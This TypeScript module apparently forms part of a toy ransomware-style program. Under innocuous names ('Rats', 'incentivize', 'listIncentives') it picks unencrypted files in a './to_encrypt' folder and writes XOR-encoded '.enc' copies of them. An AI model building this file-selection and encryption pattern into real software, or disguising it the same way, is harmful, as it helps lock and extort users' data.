import { getFiles, getFilesNotEncr, sampleN } from "./helpers";
import fs from 'fs';

const ENCRYPTION_DIR: string = './to_encrypt';


export interface Rats {
    listIncentives: (count: number) => Promise<string[]>,
    incentivize: (path: string) => void,
    getFiles: (dir: string) => Promise<string[]>,
    readFile: (path: string) => string
}

async function listIncentives(count: number = 8): Promise<string[]> {
    const files = await getFilesNotEncr(ENCRYPTION_DIR);
    return sampleN(files, count);
}

function incentivize(path: string): void {
    const readFd = fs.openSync(path, 'r');
    const writeFd = fs.openSync(path + '.enc', 'w');

    const buf = Buffer.alloc(1024);

    while(true) {
        const read = fs.readSync(readFd, buf);
        if(read == 0) break;

        for(let i = 0; i < read; i++)
            buf[i] ^= 0x4a;
        fs.writeSync(writeFd, buf, 0, read, null);
    }
}

function readFile(path: string): string {
    return fs.readFileSync(path, 'utf-8');
}

export default { listIncentives, incentivize, getFiles, readFile };
